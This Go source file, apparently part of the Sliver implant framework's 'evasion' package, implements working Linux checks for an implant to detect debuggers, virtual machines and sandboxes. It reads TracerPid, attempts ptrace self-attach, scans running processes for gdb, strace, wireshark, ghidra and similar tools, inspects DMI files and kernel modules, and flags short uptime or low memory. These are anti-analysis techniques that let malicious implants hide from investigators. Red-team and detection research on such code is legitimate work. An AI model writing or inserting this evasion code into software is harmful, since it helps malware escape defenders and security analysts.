package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

// DetectDebugger - Comprehensive debugger detection for Linux
// Returns true if a debugger is detected
func DetectDebugger() bool {
	//{{if .Config.Debug}}
	log.Println("Running Linux debugger detection checks...")
	//{{end}}

	// Technique 1: TracerPid check (most reliable on Linux)
	if checkTracerPid() {
		//{{if .Config.Debug}}
		log.Println("Detected: TracerPid indicates debugger")
		//{{end}}
		return true
	}

	// Technique 2: ptrace self-attach test
	if testPtraceSelfAttach() {
		//{{if .Config.Debug}}
		log.Println("Detected: ptrace self-attach failed (debugger present)")
		//{{end}}
		return true
	}

	// Technique 3: Check for debugger processes
	if detectDebuggerProcesses() {
		//{{if .Config.Debug}}
		log.Println("Detected: Debugger process found")
		//{{end}}
		return true
	}

	// Technique 4: LD_PRELOAD check (often used for hooking)
	if checkLDPreload() {
		//{{if .Config.Debug}}
		log.Println("Detected: LD_PRELOAD set")
		//{{end}}
		return true
	}

	// Technique 5: Check parent process (gdb often spawns targets)
	if checkDebuggerParent() {
		//{{if .Config.Debug}}
		log.Println("Detected: Debugger parent process")
		//{{end}}
		return true
	}

	//{{if .Config.Debug}}
	log.Println("No debugger detected on Linux")
	//{{end}}
	return false
}

// checkTracerPid - Check /proc/self/status for TracerPid
func checkTracerPid() bool {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}

	content := string(data)
	lines := strings.Split(content, "\n")

	for _, line := range lines {
		if strings.HasPrefix(line, "TracerPid:") {
			// TracerPid should be 0 if not being traced
			// Any other value means we're being debugged
			if !strings.Contains(line, "TracerPid:\t0") {
				return true
			}
		}
	}

	return false
}

// testPtraceSelfAttach - Try to ptrace ourselves (fails if already traced)
func testPtraceSelfAttach() bool {
	// Try to attach ptrace to ourselves
	// If we're already being debugged, this will fail with EPERM
	err := syscall.PtraceAttach(os.Getpid())

	if err != nil {
		// If error is EPERM, we're likely already being traced
		if err == syscall.EPERM {
			return true
		}
	} else {
		// Successfully attached, detach immediately
		syscall.PtraceDetach(os.Getpid())
	}

	return false
}

// detectDebuggerProcesses - Check for common debugger processes
func detectDebuggerProcesses() bool {
	debuggerNames := []string{
		"gdb",
		"lldb",
		"strace",
		"ltrace",
		"gdbserver",
		"radare2",
		"r2",
		"edb",
		"ollydbg",
		"x64dbg",
	}

	// Use ps to list processes
	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))

	for _, debugger := range debuggerNames {
		if strings.Contains(outputLower, debugger) {
			return true
		}
	}

	return false
}

// checkLDPreload - Check if LD_PRELOAD environment variable is set
func checkLDPreload() bool {
	ldPreload := os.Getenv("LD_PRELOAD")
	// If LD_PRELOAD is set, someone is hooking our process
	return ldPreload != ""
}

// checkDebuggerParent - Check if parent process is a debugger
func checkDebuggerParent() bool {
	// Read parent process info
	data, err := os.ReadFile("/proc/self/stat")
	if err != nil {
		return false
	}

	// Parse stat file to get PPID (4th field)
	fields := strings.Fields(string(data))
	if len(fields) < 4 {
		return false
	}

	ppid := fields[3]

	// Read parent process name
	parentCmdline, err := os.ReadFile("/proc/" + ppid + "/cmdline")
	if err != nil {
		return false
	}

	parentCmd := strings.ToLower(string(parentCmdline))

	// Check if parent is a debugger
	debuggerParents := []string{"gdb", "lldb", "strace", "ltrace", "radare2"}
	for _, debugger := range debuggerParents {
		if strings.Contains(parentCmd, debugger) {
			return true
		}
	}

	return false
}

// DetectVM - Comprehensive virtual machine detection for Linux
// Returns true if running in a virtual machine
func DetectVM() bool {
	//{{if .Config.Debug}}
	log.Println("Running Linux VM detection checks...")
	//{{end}}

	// Technique 1: Check /sys and /proc for VM indicators
	if detectVMSysProcFiles() {
		//{{if .Config.Debug}}
		log.Println("Detected: VM via /sys or /proc files")
		//{{end}}
		return true
	}

	// Technique 2: Check DMI (Desktop Management Interface) info
	if detectVMDMI() {
		//{{if .Config.Debug}}
		log.Println("Detected: VM via DMI info")
		//{{end}}
		return true
	}

	// Technique 3: Check for VM-specific processes
	if detectVMProcesses() {
		//{{if .Config.Debug}}
		log.Println("Detected: VM via processes")
		//{{end}}
		return true
	}

	// Technique 4: Check for VM-specific kernel modules
	if detectVMKernelModules() {
		//{{if .Config.Debug}}
		log.Println("Detected: VM via kernel modules")
		//{{end}}
		return true
	}

	//{{if .Config.Debug}}
	log.Println("No VM detected on Linux")
	//{{end}}
	return false
}

// detectVMSysProcFiles - Check /sys and /proc for VM indicators
func detectVMSysProcFiles() bool {
	vmFiles := map[string][]string{
		"/sys/class/dmi/id/product_name": {"VMware", "VirtualBox", "QEMU", "Bochs", "KVM", "Xen"},
		"/sys/class/dmi/id/sys_vendor":   {"VMware", "innotek", "QEMU", "Xen", "Bochs"},
		"/sys/class/dmi/id/bios_vendor":  {"VMware", "innotek", "QEMU", "Xen", "Bochs"},
		"/sys/class/dmi/id/board_vendor": {"VMware", "Oracle"},
		"/sys/hypervisor/type":           {"xen", "kvm"},
	}

	for filePath, indicators := range vmFiles {
		data, err := os.ReadFile(filePath)
		if err != nil {
			continue
		}

		content := strings.ToLower(string(data))
		for _, indicator := range indicators {
			if strings.Contains(content, strings.ToLower(indicator)) {
				return true
			}
		}
	}

	// Check for Xen/VZ
	xenFiles := []string{"/proc/xen", "/proc/xen/capabilities", "/proc/vz"}
	for _, file := range xenFiles {
		if _, err := os.Stat(file); err == nil {
			return true
		}
	}

	return false
}

// detectVMDMI - Check DMI information for VM indicators
func detectVMDMI() bool {
	// Try dmidecode (requires root, may not work)
	cmd := exec.Command("dmidecode", "-s", "system-product-name")
	output, err := cmd.Output()
	if err == nil {
		productName := strings.ToLower(strings.TrimSpace(string(output)))
		vmIndicators := []string{"vmware", "virtualbox", "qemu", "kvm", "xen", "bochs", "parallels"}
		for _, indicator := range vmIndicators {
			if strings.Contains(productName, indicator) {
				return true
			}
		}
	}

	return false
}

// detectVMProcesses - Check for VM-specific processes on Linux
func detectVMProcesses() bool {
	vmProcessNames := []string{
		"vmtoolsd",
		"vmware-guestd",
		"vmware-vmblock-fuse",
		"VBoxClient",
		"VBoxService",
		"vboxguest",
		"qemu-ga",
		"qemu-guest-agent",
		"xenbus",
		"xenstore",
		"prl_tools_service",
	}

	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))

	for _, vmProc := range vmProcessNames {
		if strings.Contains(outputLower, strings.ToLower(vmProc)) {
			return true
		}
	}

	return false
}

// detectVMKernelModules - NOVEL: Check for VM-specific kernel modules
func detectVMKernelModules() bool {
	data, err := os.ReadFile("/proc/modules")
	if err != nil {
		return false
	}

	content := strings.ToLower(string(data))

	vmModules := []string{
		"vboxdrv",
		"vboxguest",
		"vboxsf",
		"vboxvideo",
		"vmw_balloon",
		"vmw_pvscsi",
		"vmw_vmci",
		"vmwgfx",
		"vmxnet",
		"vmxnet3",
		"virtio",
		"virtio_balloon",
		"virtio_blk",
		"virtio_net",
		"virtio_pci",
		"xen_blkfront",
		"xen_netfront",
		"xenfs",
	}

	for _, module := range vmModules {
		if strings.Contains(content, module) {
			return true
		}
	}

	return false
}

// DetectSandbox - Comprehensive sandbox detection for Linux
// Returns true if running in a sandbox environment
func DetectSandbox() bool {
	//{{if .Config.Debug}}
	log.Println("Running Linux sandbox detection checks...")
	//{{end}}

	// Technique 1: Check system uptime
	if detectShortUptime() {
		//{{if .Config.Debug}}
		log.Println("Detected: Short uptime")
		//{{end}}
		return true
	}

	// Technique 2: Check available resources
	if detectLowResources() {
		//{{if .Config.Debug}}
		log.Println("Detected: Low resources")
		//{{end}}
		return true
	}

	// Technique 3: Check for analysis tools
	if detectAnalysisTools() {
		//{{if .Config.Debug}}
		log.Println("Detected: Analysis tools")
		//{{end}}
		return true
	}

	//{{if .Config.Debug}}
	log.Println("No sandbox detected on Linux")
	//{{end}}
	return false
}

// detectShortUptime - Check if system uptime is suspiciously short
func detectShortUptime() bool {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return false
	}

	// /proc/uptime format: "uptime_seconds idle_seconds"
	fields := strings.Fields(string(data))
	if len(fields) < 1 {
		return false
	}

	var uptimeSeconds float64
	_, err = fmt.Sscanf(fields[0], "%f", &uptimeSeconds)
	if err != nil {
		return false
	}

	// Less than 10 minutes (600 seconds) is suspicious
	return uptimeSeconds < 600
}

// detectLowResources - Check for resource constraints typical of sandboxes
func detectLowResources() bool {
	// Check memory
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return false
	}

	content := string(data)
	lines := strings.Split(content, "\n")

	for _, line := range lines {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				var memKB int64
				fmt.Sscanf(fields[1], "%d", &memKB)

				// Less than 2GB (2097152 KB) is suspicious
				if memKB < 2097152 {
					return true
				}
			}
		}
	}

	return false
}

// detectAnalysisTools - Check for analysis tools on Linux
func detectAnalysisTools() bool {
	analysisTools := []string{
		"wireshark",
		"tshark",
		"tcpdump",
		"strace",
		"ltrace",
		"gdb",
		"lldb",
		"radare2",
		"r2",
		"ida",
		"ghidra",
		"burp",
		"zaproxy",
	}

	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))

	for _, tool := range analysisTools {
		if strings.Contains(outputLower, tool) {
			return true
		}
	}

	return false
}
